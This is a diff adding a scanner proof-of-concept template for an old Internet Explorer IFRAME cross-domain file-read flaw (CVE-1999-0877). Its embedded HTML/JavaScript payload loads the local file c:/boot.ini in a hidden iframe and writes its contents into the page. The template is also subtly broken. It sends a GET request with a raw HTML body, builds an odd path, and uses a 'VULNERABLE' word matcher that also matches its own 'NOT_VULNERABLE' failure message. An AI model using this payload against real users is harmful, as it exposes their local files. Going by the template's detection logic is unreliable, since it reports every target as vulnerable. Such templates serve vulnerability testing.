@@ -1,0 +1,49 @@
+[info]
+author = "ave"
+description = "通过构造恶意HTML页面，利用IE 5.0/4.0.1中IFRAME元素的ExecCommand方法跨域访问缺陷，读取目标用户本地文件。当使用IE 4.0.1/5.0访问该页面时，浏览器会尝试跨域读取file://协议下的本地文件内容。"
+id = "POC-AVE-1999-0670"
+name = "Microsoft Internet Explorer IFRAME 信息泄露漏洞 PoC"
+severity = "medium"
+tags = ["ave-1999-0670"]
+vuln_id = [
+    "CVE-1999-0877",
+    "AVE-1999-0670",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/poc-1999-0877.html"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<html>
+<body>
+<iframe id="f" src="file:///c:/boot.ini" style="display:none"></iframe>
+<script>
+var f=document.getElementById('f');
+try{
+  f.ExecCommand('Copy',false,null);
+  document.write('VULNERABLE: IE iFrame cross-domain read succeeded');
+  document.write('<pre>'+f.innerText+'</pre>');
+}catch(e){
+  document.write('NOT_VULNERABLE: '+e.message);
+}
+</script>
+</body>
+</html>"""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["VULNERABLE"]
